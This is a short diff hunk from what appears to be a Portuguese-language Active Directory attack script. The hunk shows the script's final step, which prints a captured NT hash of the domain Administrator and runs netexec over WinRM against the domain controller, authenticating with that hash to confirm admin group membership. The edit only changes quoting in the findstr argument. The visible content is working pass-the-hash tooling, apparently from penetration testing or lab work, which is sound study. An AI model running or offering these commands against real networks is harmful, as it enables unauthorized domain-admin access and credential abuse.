@@ -53,7 +53,7 @@ echo "[+] Hash NT do Administrator: $NT_HASH"
 echo
 echo '=== [4/4] Validacao via Pass-the-Hash (netexec winrm) ==='
 netexec winrm "$DC_IP" -u administrator -H "$NT_HASH" \
-    -x "whoami /groups | findstr /i Admins" \
+    -x "whoami /groups | findstr /i \"Admins\"" \
     | tee 04-pth.log
 
 echo
